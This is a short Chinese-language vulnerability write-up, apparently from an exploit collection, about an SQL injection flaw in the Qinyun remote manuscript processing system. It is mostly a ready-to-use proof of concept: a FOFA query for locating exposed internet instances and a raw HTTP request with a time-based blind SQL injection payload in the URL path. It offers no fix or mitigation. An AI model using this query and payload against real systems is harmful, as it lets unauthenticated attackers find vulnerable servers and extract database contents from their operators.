# 勤云远程稿件处理系统存在SQL注入漏洞

勤云远程稿件处理系统 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息。

## fofa
```javascript
body="北京勤云科技"
```

## poc
```javascript
GET /burpsuite'if%20db_name(1)='master'%20waitfor%20delay%20'0:0:5'--/article/abstract/1 HTTP/1.1
Host: 
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

![image-20241227220754753](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272207815.png)